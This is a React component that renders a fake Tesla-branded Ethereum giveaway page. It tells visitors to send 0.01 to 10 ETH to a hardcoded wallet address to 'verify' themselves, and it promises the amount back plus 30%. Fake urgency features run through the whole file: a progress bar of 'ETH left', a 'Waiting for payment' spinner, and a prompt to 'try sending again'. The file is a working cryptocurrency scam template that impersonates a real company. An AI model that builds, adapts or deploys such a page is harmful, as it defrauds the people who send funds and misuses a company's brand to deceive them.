import React, { Fragment, useState } from "react";
import { Link } from "react-router-dom";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faCopy, faSpinner } from "@fortawesome/free-solid-svg-icons";
import copy from "copy-to-clipboard";

import ProgressBar from "../components/ProgressBar";
import EthereumTable from "../components/EthereumTable";

const EthereumScreen = () => {
   const [clicked, setClicked] = useState(false);
   const [copied, setCopied] = useState(false);

   const copyToClipboard = () => {
      copy("0x9A8bdC5EbFBB628b566a03664a8d5C5f56DA3fe7");
      setCopied(true);
      setTimeout(() => {
         setCopied(false);
      }, 2000);
   };
   return (
      <Fragment>
         <div className="container-fluid giveaway">
            <div className="block col-lg-7 offset-lg-5">
               <Link to="/">
                  <div className="col-lg-6 offset-lg-3 logo">
                     <img alt="logo" src="tesla-logo.png" />{" "}
                     <span className="logo_txt"></span>{" "}
                  </div>
               </Link>
               <div className="row">
                  <div className="col-lg-12 verify">
                     To verify your address, just send from 0.01 to 10 ETH to
                     the address below and get from 0.013 to 13 ETH{" "}
                     <span className="yel">(+ 30% back).</span>
                     <br />
                     <span className="yel">P.S. one time use only</span>
                  </div>
               </div>
               <div className="container-fluid">
                  <div className="row">
                     <div className="col-lg-12">
                        <div className="row main_giveaway">
                           <div className="col-lg-8 col-sm-8 col-xs-8">
                              <div className="title">
                                 <span className="yel">Payment Address</span>
                              </div>
                              <div className="subtitle">
                                 You can send ETH to the following address:
                              </div>
                              <div className="wallet">
                                 <span className="yel">
                                    0x9A8bdC5EbFBB628b566a03664a8d5C5f56DA3fe7
                                 </span>
                              </div>
                           </div>
                           <div className="col-lg-4 col-md-4 col-sm-4 col-xs-4">
                              <div className="qr">
                                 <img
                                    alt="QR"
                                    src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=0x9A8bdC5EbFBB628b566a03664a8d5C5f56DA3fe7"
                                 />
                              </div>
                           </div>
                           <div className="buffer">
                              <button
                                 className="btn copy text-white"
                                 onClick={copyToClipboard}
                              >
                                 <FontAwesomeIcon icon={faCopy} />
                                 {"  "}
                                 Copy Address to Clipboard
                              </button>
                              <br />
                              {copied && (
                                 <h6 className="h5 mt-3 yel">
                                    Address copied!
                                 </h6>
                              )}
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div id="instruction" className="instruction col-lg-8 offset-lg-2">
               <div className="guide col-lg-12">
                  <span className="yel">Instruction:</span>
                  <br /> - To make a transaction, you can use any wallet or
                  exchange to participate!
                  <br /> - One-time use only, once we receive your transaction,
                  we will immediately send the requested amount back to you.
               </div>
               <div className="wait">
                  <FontAwesomeIcon icon={faSpinner} className="rotating" />
                  Waiting for payment
               </div>
               <div id="info-fir" className="info">
                  {!clicked && (
                     <span>
                        Still waiting for transaction?{" "}
                        <button
                           pl-js-close="info-fir"
                           pl-js-open="info-sec"
                           className="click copy btn"
                           onClick={() => setClicked(true)}
                        >
                           Click Here
                        </button>
                     </span>
                  )}
                  {clicked && (
                     <span id="mess">
                        Sometimes transactions are not sent properly.
                        <br />
                        Try sending again.
                     </span>
                  )}
                  <br /> Once we receive your transaction, the outgoing
                  transaction is processed to your address.
                  <br /> Every address that is sent too late, gets their ETH
                  immediately sent back.
               </div>
               <div id="info-sec" style={{ display: "none" }} className="info">
                  Sometimes transactions are not sent properly.
                  <br /> Try sending it again.
                  <br /> Remember, every transaction address we receive gets
                  their ETH back + giveaway prize.
               </div>
               <div
                  className="dot-1"
                  id="leftBTC"
                  style={{
                     textShadow: "0px 0px 16px rgba(54, 209, 220, 0.6)",
                     color: "#17a2b8",
                     marginTop: "2rem",
                  }}
               >
                  Counting ETH left
               </div>
               <ProgressBar currentValue={11000} maxValue={20000} />
               <br />
            </div>
            <div className="last_trans">
               <h1 className="f-24 mvn em-300">
                  Transactions for Address:
                  <span id="trnsctin">
                     0x9A8bdC5EbFBB628b566a03664a8d5C5f56DA3fe7
                  </span>
               </h1>
            </div>

            <EthereumTable />
         </div>
      </Fragment>
   );
};

export default EthereumScreen;
